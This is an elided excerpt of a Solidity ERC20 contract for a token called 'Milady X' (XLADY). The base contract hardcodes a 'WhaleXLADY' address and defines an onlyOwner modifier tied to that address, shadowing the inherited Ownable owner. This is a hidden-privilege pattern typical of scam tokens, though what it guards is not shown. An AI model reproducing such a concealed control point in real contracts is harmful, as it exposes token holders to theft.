...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XLADYwebsite = "https://www.XLADY.land/";
    string public XLADYADDRESS = "0x0cE0BfFe077Ded0C424228959E05DDa258751510";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXLADY;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXLADY = 0x0cE0BfFe077Ded0C424228959E05DDa258751510;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXLADYwebsite() public view returns (string memory) {
        return XLADYwebsite;
    } 


               function getXLADYADDRESS() public view returns (string memory) {
        return XLADYADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXLADY);
        _;
    }    
    function _approve(
        address owner,
...
contract XLADY is ERC20, Ownable {
    constructor () ERC20("Milady X", "XLADY") 
    {    
